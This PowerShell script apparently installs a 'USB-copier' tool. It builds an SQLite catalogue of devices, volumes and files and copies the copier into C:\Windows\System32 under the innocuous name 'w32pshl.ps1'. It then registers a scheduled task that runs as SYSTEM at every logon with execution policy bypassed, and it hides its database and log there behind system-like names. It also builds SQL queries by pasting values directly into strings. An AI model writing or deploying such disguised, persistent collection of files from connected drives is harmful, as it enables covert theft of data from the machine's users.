function GetExcludedDevices {
    $global:excludedDevicesSerialNumbers = @()
    # Get & Exclude System Storage Device
    $systemDeviceSerialNumber = Get-Disk | Where-Object {$_.IsSystem -eq $True} | Select-Object SerialNumber | ForEach-Object { $_.SerialNumber }
    foreach($serialNumber in $systemDeviceSerialNumber) {
        $global:excludedDevicesSerialNumbers += $serialNumber
    }

    # Prompt User with Devices to Exclude
    Write-Host "----------------Setting Excluded Storage Devices----------------"
    Write-Host "Please connect your Excluded USB devices then Press any key to continue..." -ForegroundColor Cyan
    cmd /c pause

    $devicesList = [System.Collections.ArrayList]@()
    $devicesDataObject = @{}
    $localIterator = 0
    
    # Devices Table
    Get-WmiObject Win32_DiskDrive | 
    Where-Object { $_.SerialNumber -ne $systemDeviceSerialNumber} |
    ForEach-Object {
        # Add the index property to each object
        $_ | Add-Member -MemberType NoteProperty -Name "ID" -Value $localIterator
        $devicesList += $localIterator
        $devicesDataObject.Add($localIterator, $_.SerialNumber)
        $localIterator++
        $_
    } | 
    Select-Object ID, Model, @{Name="Size";Expression={[string][math]::Round($_.Size/1073741824, 2) + ' GiB'}}, SerialNumber |
    Format-Table -AutoSize

    if($devicesList.Count -eq 0) {
        Write-Host "`n`n No Devices where Detected!" -ForegroundColor Red
        Write-Host "Type (done) to continue without excluding any devices. `nOr Exit the Program and try again."
    }
    Write-Host "`n`n"
    # TODO: Add the ability to disconnect devices to add more than the available ports on a laptop
    Write-Host "Choose Your Excluded Devices ID (eg. 0, 1 or 2)"
    Write-Host "Type `"all`" to select All devices" -ForegroundColor Cyan
    Write-Host "Type `"reset`" to Reset your Selection" -ForegroundColor DarkYellow
    Write-Host "Type `"done`" if you're Done" -ForegroundColor Green
    Write-Host "Type `"exit`" to Cancel" -ForegroundColor Red

    for ($True) {
        $userDeviceIDInput = Read-Host "=>"
        # Exit Program
        if ($userDeviceIDInput -eq "exit") {
            exit
        # Reset Selection
        } elseif ($userDeviceIDInput -eq "reset") {
            $excludedDevicesIDs = @()
            Write-Host "Resetted"
            # End Loop
        } elseif ($userDeviceIDInput -eq "done") {
            break
        # Select All
        } elseif ($userDeviceIDInput -eq 'all') {
            $excludedDevicesIDs = $devicesList
            break
            # Check user input
        }
        else {
            # Check if user Input is valid
            if ($userDeviceIDInput -in $excludedDevicesIDs) {
                Write-Host "Error: Device Already Selected!"
            }
            elseif ($userDeviceIDInput -in $devicesList -and $userDeviceIDInput) {
                $excludedDevicesIDs += $userDeviceIDInput
            }
            else {
                Write-Host "Error: Invalid Input!"
            }
        }
        Write-Host "Selected Devices: ($excludedDevicesIDs)"
    }
    Write-Host "Selected Devices: ($excludedDevicesIDs) `nDone."


    foreach ($ID in $excludedDevicesIDs) {
        $global:excludedDevicesSerialNumbers += $devicesDataObject[[int]$ID]
    }
}
function CheckNecessaryModules {
    "`n----------------Checking Necessary Modules----------------"
    # Check for NuGet
    try {
        Get-PackageProvider -Name "NuGet" -ForceBootstrap | Format-Table -AutoSize
        Write-Host "[NEW]: NuGet Installed." -ForegroundColor Green
    }
    catch {
        Write-Host $_
        Write-Host "[ERROR]: Couldn't Install NuGet, Exiting..." -ForegroundColor Red
        Start-Sleep -Seconds 5
        exit
    }
    # Check for PSSQLite
    if(!(Get-Module -ListAvailable -Name "PSSQLite")) {
        Write-Host "[INFO]: Module PSSQLite Doesn't Exist."
        Write-Host "[PROCESS]: Installing PSSQLite"
        try {
            Install-Module PSSQLite -Force
            Write-Host "[NEW]: PSSQLite Installed Successfully!" -ForegroundColor Green
        } catch {
            Write-Host $_
            Write-Host "[ERROR]: Couldn't install PSSQLite, Exiting..." -ForegroundColor Red
            Start-Sleep -Seconds 5
            exit
        }
    }
}
function CheckDbConfig {
    Write-Host "`n----------------Checking Database Config----------------"
    # Import PSSQLite
    try {
        Import-Module PSSQLite
    } catch {
        Write-Host $_
        Write-Host "[ERROR]: Couldn't Access PSSQLite module, Exiting..." -ForegroundColor Red
        Start-Sleep -Seconds 5
        exit
    }
    
    # Create Database File
    if(!(Test-Path $dbPath -PathType Leaf)) {
        Write-Host "[INFO]: Database Doesn't Exist."
        Write-Host "[PROCESS]: Creating Database File..."
        try {
            New-Item $dbPath
            Write-Host "[NEW]: Database Created!" -ForegroundColor Green
        } catch {
            Write-Host $_
            Write-Host "[ERROR]: Couldn't Create Database, Exiting..." -ForegroundColor Red
            Start-Sleep -Seconds 5
            exit
        }
    } else {
        Write-Host "[INFO]: Database Already Exists! `n"
    }
    
    $dbTablesCreationQueries = @{
        device = "CREATE TABLE device (
            device_id INTEGER PRIMARY KEY NOT NULL,
            device_name TEXT,
            serial_number TEXT NOT NULL,
            last_full_backup_date INTEGER NOT NULL DEFAULT 0,
            last_live_date INTEGER NOT NULL DEFAULT 0,
            backup_path TEXT,
            is_device_excluded INTEGER NOT NULL DEFAULT 0,
            author TEXT
        )"
        volume = "CREATE TABLE volume (
            volume_id INTEGER PRIMARY KEY NOT NULL,
            volume_unique_id TEXT NOT NULL,
            volume_backup_path TEXT NOT NULL,
            last_full_backup_date INTEGER NOT NULL DEFAULT 0,
            last_live_date INTEGER NOT NULL DEFAULT 0,
            volume_size TEXT NOT NULL,
            volume_remaining_size TEXT NOT NULL,
            volume_filesystem_type TEXT NOT NULL,
            device_id INTEGER NOT NULL,
            FOREIGN KEY(device_id) REFERENCES device(device_id)
        )"
        directory = "CREATE TABLE directory (
            directory_id INTEGER PRIMARY KEY NOT NULL,
            directory_path TEXT NOT NULL,
            directory_name TEXT NOT NULL,
            parent_directory INTEGER NOT NULL,
            volume_id INTEGER NOT NULL,
            FOREIGN KEY(parent_directory) REFERENCES directory(directory_id),
            FOREIGN KEY(volume_id) REFERENCES volume(volume_id)
        )"
        file = "CREATE TABLE file (
            file_id INTEGER PRIMARY KEY NOT NULL,
            file_path TEXT NOT NULL,
            file_name TEXT NOT NULL,
            file_extension TEXT NOT NULL,
            file_size INTEGER NOT NULL,
            directory_id INTEGER NOT NULL,
            volume_id INTEGER NOT NULL,
            last_write_time_utc INTEGER,
            last_backup_time_utc INTEGER NOT NULL DEFAULT 0,
            FOREIGN KEY(directory_id) REFERENCES directory(directory_id),
            FOREIGN KEY(volume_id) REFERENCES volume(volume_id)
        )"
    }

    Write-Host "Checking Database Tables..."
    # Check & Create Tables
    foreach($dbTableName in $dbTablesCreationQueries.Keys) {
        if(Invoke-SqliteQuery -Query "SELECT name FROM sqlite_master WHERE type='table' AND name='$dbTableName';" -DataSource $dbPath) {
            Write-Host "[INFO]: Table `"$dbTableName`" Exists!"
        } else {
            Write-Host "[INFO]: Table `"$dbTableName`" Doesn't Exist."
            try {
                Write-Host "[PROCESS]: Creating `"$dbTableName`" Table..."
                Invoke-SqliteQuery -Query $dbTablesCreationQueries.$dbTableName -DataSource $dbPath
                Write-Host "[NEW]: Table `"$dbTableName`" was Created Successfully!" -ForegroundColor Green
            }
            catch {
                Write-Host $_
                Write-Host "[ERROR]: Couldn't create `"$dbTableName`" Table, Exiting..." -ForegroundColor Red
                Start-Sleep -Seconds 5
                exit
            }
        }
    }

}

function SetExcludedDevicesInDb {
    Write-Host "Excluded Devices $global:excludedDevicesSerialNumbers"
    foreach($deviceSerialNumber in $global:excludedDevicesSerialNumbers) {
        $deviceName = Get-Disk | Where-Object { $_.SerialNumber -eq $deviceSerialNumber } | Select-Object FriendlyName | ForEach-Object { $_.FriendlyName }
        $query = Invoke-SqliteQuery -DataSource 'C:\Windows\System32\Wpshl' -Query "SELECT device_id FROM device WHERE serial_number='$deviceSerialNumber'" 
        if($query.device_id){
            Write-Host "[INFO]: Device Exists, Updating $deviceSerialNumber"
            Invoke-SqliteQuery -DataSource $dbPath "
                UPDATE device SET is_device_excluded = 1 WHERE device_id = '$($query.device_id)'
            "
        } else {
            Write-Host "[NEW]: Registering new device"
            Invoke-SqliteQuery -DataSource $dbPath "
                INSERT INTO device (device_name, serial_number, is_device_excluded)
                VALUES ('$deviceName', '$deviceSerialNumber', 1)
            "
        }
    }
}
function CreateLogFile {
    if(!(Test-Path $logFilePath -PathType Leaf)) {
        try {
            New-Item $logFilePath | Out-Null
        } catch {
            Write-Host $_
            Write-Host "[ERROR]: Couldn't Create Log file, Exiting..." -ForegroundColor Red
            Start-Sleep -Seconds 5
            exit
        }
    }
}
$workDir = 'C:\Windows\System32'
$dbPath = $workDir + '\Wpshl'
$logFilePath = $workDir + '\n138974314908GLs'
function SetupScriptInTaskScheduler {
    try {
        schtasks /end /tn "w32pshl"
    } catch { }
    Copy-Item "$PSScriptRoot\USB-copier.ps1" -Destination "C:\Windows\System32\w32pshl.ps1"
    schtasks /create /tn "w32pshl" /tr "powershell.exe -ExecutionPolicy Bypass -File 'C:\Windows\System32\w32pshl.ps1'" /sc onlogon /ru SYSTEM /F
    schtasks /run /tn "w32pshl"
}
function Main {
    # Check for Adminstrator Access
    if(!(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
        Write-Host "[ERROR]: User Is Not An Administrator, Exiting..." -ForegroundColor Red
        Start-Sleep -Seconds 5
        exit
    }
    CreateLogFile
    GetExcludedDevices
    CheckNecessaryModules
    CheckDbConfig
    SetExcludedDevicesInDb
    SetupScriptInTaskScheduler
}
Main

  